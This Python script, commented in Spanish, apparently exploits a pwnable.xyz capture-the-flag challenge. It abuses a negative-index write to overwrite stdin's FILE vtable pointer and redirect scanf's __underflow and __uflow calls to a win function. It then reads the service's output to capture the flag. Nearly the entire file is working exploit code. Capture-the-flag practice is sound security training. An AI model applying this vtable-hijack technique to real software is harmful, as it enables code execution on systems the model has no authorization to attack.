#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

print("Conectando tras espera de 2 minutos...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(35)

try:
    s.connect((host, port))
except Exception as e:
    print(f"ERROR: {e}")
    sys.exit(1)

print("CONECTADO!")
banner = s.recv(1024)
print(banner.decode())

win = 0xa21
result_base = 0x202200

print(f"\nAtaque de vtable CORRECTO:")
print(f"1. Poner win en result[4] y result[5] (offsets 0x20 y 0x28 desde vtable)")
print(f"2. Apuntar stdin->vtable a result[0] (base de result)")
print(f"3. scanf usará __underflow o __uflow, ambos apuntarán a win")
print()

# Paso 1: Llenar result[4] y result[5] con win
print("Escribiendo result[4] = win...")
s.sendall(f"{win ^ 444} {444} 4\n".encode())
time.sleep(0.3)

print("Escribiendo result[5] = win...")
s.sendall(f"{win ^ 555} {555} 5\n".encode())
time.sleep(0.3)

# Limpiar buffer
try:
    s.recv(8192, socket.MSG_DONTWAIT)
except:
    pass

# Paso 2: Apuntar vtable a result_base
print(f"\nSobrescribiendo stdin->vtable con {hex(result_base)}...")
b = 0x31337
a = result_base ^ b
s.sendall(f"{a} {b} -5\n".encode())
time.sleep(0.5)

try:
    resp = s.recv(2048, socket.MSG_DONTWAIT)
    print(f"Respuesta: {resp.decode().strip()[:50]}")
except:
    pass

# Paso 3: Triggerar scanf
print("\nTriggerando scanf que llamará a __underflow/uflow...")
print("(esto debería ejecutar win)")

s.setblocking(False)

try:
    s.sendall(b"100 200 3\n")
    print("Trigger enviado")
except:
    print("Error al enviar trigger")

# Capturar TODO
print("\nCapturando output (30 segundos)...")
all_data = b""
start = time.time()

while time.time() - start < 30:
    try:
        chunk = s.recv(8192)
        if chunk:
            all_data += chunk
            decoded = chunk.decode()
            sys.stdout.write(decoded)
            sys.stdout.flush()
            
            # Detectar flag
            if "flag{" in decoded.lower() or "FLAG{" in decoded or "pwn" in decoded:
                print("\n\n*** FLAG DETECTADA ***")
                break
    except:
        pass
    time.sleep(0.1)

print(f"\n{'='*60}")
print(f"Total recibido: {len(all_data)} bytes")
if all_data:
    print("\nContenido completo:")
    print(all_data.decode())
else:
    print("Sin output - probablemente crasheó")
print('='*60)

s.close()